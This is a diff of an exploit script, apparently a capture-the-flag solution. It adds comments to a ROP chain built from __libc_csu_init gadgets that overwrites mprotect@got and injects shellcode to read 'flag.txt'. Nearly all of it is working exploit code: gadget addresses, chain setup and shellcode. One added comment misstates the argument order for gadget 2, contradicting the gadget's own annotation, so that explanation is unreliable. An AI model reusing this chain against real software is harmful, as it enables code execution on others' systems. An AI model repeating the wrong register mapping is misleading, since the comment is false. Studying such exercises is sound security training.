@@ -28,10 +28,13 @@ seven_byte_shellcode = asm('''
 p.send(seven_byte_shellcode)
 
 # 2. use three special gadgets to ROP for long shellcode injection
+# gadget 1 pops six registers including rbx, rbp, r12, r13, r14, r15
 GADGET_1 = 0x401362  # __libc_csu_init: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+# gadget 2 calls a function pointer in r12+rbx*8 with r15 as the first argument, r14 as the second argument, r13 as the third argument, and then pops six registers including rbx, rbp, r12, r13, r14, r15 again just like gadget 1
 GADGET_2 = 0x401348  # __libc_csu_init: mov rdx, r15; mov rsi, r14; mov edi, r13; call qword ptr [r12+rbx*8]; add rbx, 0x1; cmp rbp, rbx; jne 0x401348; add rsp, 0x8; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
+# gadget 3 adds ebx to a value in rbp-0x3d
 GADGET_3 = 0x401218  # __do_global_dtors_aux: add dword ptr [rbp-0x3d], ebx; nop dword ptr [rax+rax]; ret;
-MPROTECT_GOT = 0x403fe8
+MPROTECT_GOT = 0x403fe8  # mprotect@got
 shellcode = asm('''
     /* push filename 'flag.txt\x00' to stack */
     mov rsi, 0
